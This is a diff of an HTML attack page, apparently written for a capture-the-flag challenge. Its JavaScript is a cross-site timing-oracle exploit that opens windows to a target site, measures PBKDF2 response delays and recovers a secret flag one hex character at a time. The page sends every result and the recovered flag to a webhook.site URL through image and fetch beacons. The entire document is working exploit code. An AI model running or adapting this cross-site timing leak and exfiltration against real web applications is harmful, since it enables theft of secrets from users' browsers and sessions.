@@ -1,8 +1,10 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
-// v5 - pure diagnostic: test single chars to find what flag starts with
+// v6 - full timing oracle with correct threshold (~460ms PBKDF2)
 var T="https://svfgp.breakable.live";
 var W="https://webhook.site/10a463c9-e597-4bed-930e-21ae49f6f588";
-var PT=15000; // 15s timeout to ensure we catch PBKDF2 (3M iter ~5-8s)
+var known="CTF{";
+var HEX="0123456789abcdef";
+var PT=5000; // 5s timeout per probe (PBKDF2 is ~460ms)
 
 function exfil(d){
   var u=W+"?d="+encodeURIComponent(d)+"&t="+Date.now();
@@ -10,102 +12,90 @@ function exfil(d){
   try{new Image().src=u+"&x=1";}catch(e){}
 }
 
-exfil("v5_LOADED");
+exfil("v6_LOADED");
 
-function probe(q){
+function probeOne(q){
   return new Promise(function(res){
     var sid="s"+Date.now()+"-"+Math.random().toString(36).slice(2,8);
     var rid="r"+Math.random().toString(36).slice(2,8);
     var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
       "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
-    var t0=Date.now();
+    var t0=performance.now();
     var wn="p_"+Math.random().toString(36).slice(2,8);
     var w;
     try{w=window.open(url,wn);}catch(e){res({q:q,t:0,src:"err"});return;}
     if(!w){res({q:q,t:0,src:"null"});return;}
     var done=false;
-    function fin(ms,src){if(done)return;done=true;try{w.close();}catch(e){}res({q:q,t:ms,src:src});}
+    function fin(ms,src){if(done)return;done=true;try{w.close();}catch(e){}res({q:q,t:Math.round(ms),src:src});}
     function handler(e){
       if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
         window.removeEventListener("message",handler);
-        fin(Date.now()-t0,"msg");
+        fin(performance.now()-t0,"msg");
       }
     }
     window.addEventListener("message",handler);
-    setTimeout(function(){window.removeEventListener("message",handler);fin(Date.now()-t0,"timeout");},PT);
+    setTimeout(function(){window.removeEventListener("message",handler);fin(performance.now()-t0,"timeout");},PT);
   });
 }
 
-function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
+// Probe all 16 hex chars in parallel for a given prefix
+function probePosition(prefix){
+  var probes=HEX.split("").map(function(ch){return probeOne(prefix+ch);});
+  return Promise.all(probes);
+}
 
 async function run(){
-  exfil("v5_START");
+  exfil("v6_START:"+known);
+  var startTime=Date.now();
 
-  // Test 1: probe "C" - if flag is CTF{...}, "CTF{hash}".startsWith("C") = true -> PBKDF2 ~5s
-  var r1=await probe("C");
-  exfil("D1_C:"+r1.t+"ms("+r1.src+")");
-  await sleep(300);
-
-  // Test 2: probe "Z" - control, should never match -> fast
-  var r2=await probe("Z");
-  exfil("D2_Z:"+r2.t+"ms("+r2.src+")");
-  await sleep(300);
-
-  // If C triggered PBKDF2, flag starts with C (likely CTF{})
-  if(r1.src==="msg" && r1.t>2500){
-    exfil("FLAG_STARTS_C:confirmed");
-    // Verify CTF{
-    var r3=await probe("CTF{");
-    exfil("D3_CTF:"+r3.t+"ms("+r3.src+")");
-    if(r3.src==="msg" && r3.t>2500){
-      exfil("PREFIX_CTF_CONFIRMED");
-      // Now find first hex char after CTF{
-      var hex="0123456789abcdef";
-      for(var i=0;i<hex.length;i++){
-        var ch=hex[i];
-        var r=await probe("CTF{"+ch);
-        exfil("CTF_"+ch+":"+r.t+"ms("+r.src+")");
-        if(r.src==="msg"&&r.t>2500){
-          exfil("FIRST_CHAR:"+ch);
-          break;
-        }
-        await sleep(100);
-      }
+  for(var pos=0;pos<64;pos++){
+    if(Date.now()-startTime > 52000){
+      exfil("TIME_UP:"+known);
+      break;
     }
-  } else {
-    // C didn't match - maybe raw SHA256 hash without CTF{ prefix
-    exfil("C_NO_MATCH:testing_hex_chars");
-    var hex="0123456789abcdef";
-    var found="";
-    for(var i=0;i<hex.length;i++){
-      var ch=hex[i];
-      var r=await probe(ch);
-      exfil("H_"+ch+":"+r.t+"ms("+r.src+")");
-      if(r.src==="msg"&&r.t>2500){
-        exfil("RAW_FIRST:"+ch);
-        found=ch;
-        break;
+
+    var results=await probePosition(known);
+    // Sort by time descending
+    results.sort(function(a,b){return b.t-a.t;});
+
+    var top=results[0];
+    var second=results[1];
+    var median=results[8];
+    var gap=top.t-second.t;
+    var topChar=top.q.slice(-1);
+
+    // Log top 3 for this position
+    var info=results.slice(0,3).map(function(r){return r.q.slice(-1)+"="+r.t;}).join(",");
+    exfil("P"+pos+":"+info+"|g="+gap+"|m="+median.t);
+
+    // The matching char should be significantly slower (PBKDF2 ~400-500ms)
+    // Accept if gap > 150ms between top and second
+    if(gap > 150 && top.src==="msg"){
+      known+=topChar;
+      exfil("F:"+known);
+    } else if(top.t - median.t > 200){
+      // Fallback: compare top vs median
+      known+=topChar;
+      exfil("F:"+known+" (median_gap="+(top.t-median.t)+")");
+    } else {
+      // Very noisy - try the position again with sequential probes
+      exfil("NOISY_P"+pos+":retrying_seq");
+      var best={c:"",t:0};
+      for(var i=0;i<HEX.length;i++){
+        var r=await probeOne(known+HEX[i]);
+        if(r.t>best.t){best={c:HEX[i],t:r.t};}
       }
-      await sleep(100);
-    }
-    if(!found){
-      // No single hex char matched - try uppercase, ctf{, other prefixes
-      exfil("NO_HEX_MATCH:trying_misc");
-      var misc=["c","t","f","ctf{","CTF","flag","FLAG{","UNR{","unr{"];
-      for(var i=0;i<misc.length;i++){
-        var r=await probe(misc[i]);
-        exfil("M_"+misc[i]+":"+r.t+"ms("+r.src+")");
-        if(r.src==="msg"&&r.t>2500){
-          exfil("MISC_HIT:"+misc[i]);
-          break;
-        }
-        await sleep(100);
-      }
+      known+=best.c;
+      exfil("F:"+known+" (seq)");
     }
   }
 
-  exfil("v5_DONE");
+  // Check if we got all 64 hex chars
+  if(known.length===4+64){
+    known+="}";
+  }
+  exfil("DONE:"+known);
 }
 
-setTimeout(run,500);
+setTimeout(run,300);
 </script></body></html>
